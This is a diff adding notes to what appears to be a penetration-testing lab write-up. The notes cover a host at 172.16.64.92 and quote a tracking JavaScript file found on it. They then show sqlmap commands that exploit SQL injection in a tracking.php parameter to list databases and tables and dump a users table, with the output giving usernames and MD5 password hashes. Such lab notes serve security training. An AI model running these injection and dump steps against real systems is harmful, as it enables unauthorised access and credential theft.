@@ -851,6 +851,121 @@ Files found with a 200 responce:
 {% endtab %}
 {% endtabs %}
 
+{% hint style="info" %}
+**Found secret url while inspecting footracking.js**
+
+* view-source:[http://172.16.64.92/assets/js/footracking.js](http://172.16.64.92/assets/js/footracking.js)
+
+```javascript
+alert("Loaded!");
+<!-- pre-login collect data -->
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+	if (this.readyState == 4 && this.status == 200) {
+		console.log("OK");
+	} else {
+		console.log("Error!");
+	}
+
+	xhr.open("GET", "http://127.0.0.1/72ab311dcbfaa40ca0739f5daf505494/tracking2.php", true);
+	xhr.send("ua=" + navigator.userAgent + "&platform=" + navigator.platform);
+}
+```
+{% endhint %}
+
+{% hint style="info" %}
+**Having found  72ab311dcbfaa40ca0739f5daf505494/tracking2.ph**p URL leads to think there's another hidden tracking.php \(without '2'\), where an `id` url parameter can be passed:
+
+![](../../../.gitbook/assets/image%20%2832%29.png) 
+
+Actions:
+
+* Try sqlmap
+* Scan new found directory with Gobuster/Dirbuster
+{% endhint %}
+
+{% tabs %}
+{% tab title="sqlmap \(discover databases\)" %}
+```bash
+sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' --dbs
+```
+{% endtab %}
+
+{% tab title="Output sqlmap dbs" %}
+```bash
+[06:13:35] [INFO] fetching database names
+available databases [2]:
+[*] footracking
+[*] information_schema
+```
+{% endtab %}
+
+{% tab title="sqlmap \(footracking tables\)" %}
+```
+sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' -D footracking --tables
+```
+{% endtab %}
+
+{% tab title="Output footracking tables" %}
+```
+Database: footracking
+[2 tables]
++----------------+
+| telemetry_test |
+| users          |
++----------------+
+```
+{% endtab %}
+
+{% tab title="sqlmap footracking.users dump" %}
+```
+sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' -D footracking -T users --dump
+```
+{% endtab %}
+
+{% tab title="Output" %}
+```
+Database: footracking                                                                                                                                                                                   
+Table: users
+[4 entries]
++----+-----+-------------------------------------------+-----------+
+| id | adm | password                                  | username  |
++----+-----+-------------------------------------------+-----------+
+| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84          | fcadmin1  |
+| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f          | fcadmin2  |
+| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b (12345)  | tracking1 |
+| 4  | no  | e10adc3949ba59abbe56e057f20f883e (123456) | tracking2 |
++----+-----+-------------------------------------------+-----------+
+
+```
+{% endtab %}
+{% endtabs %}
+
+{% hint style="warning" %}
+**Found Credentials on MySQL database via sqlmap**
+
+```text
+| id | adm | password                                  | username  |
++----+-----+-------------------------------------------+-----------+
+| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84          | fcadmin1  |
+| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f          | fcadmin2  |
+| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b (12345)  | tracking1 |
+| 4  | no  | e10adc3949ba59abbe56e057f20f883e (123456) | tracking2 |
++----+-----+-------------------------------------------+-----------+
+```
+{% endhint %}
+
+{% tabs %}
+{% tab title="Dirbuster new Route" %}
+* [http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/ ](http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/%20)
+* 
+{% endtab %}
+
+{% tab title="Second Tab" %}
+
+{% endtab %}
+{% endtabs %}
+
 ### ✔️172.16.64.166 \(Linux 3.12 - 95%\)
 
 | Port | State | Service | Version |
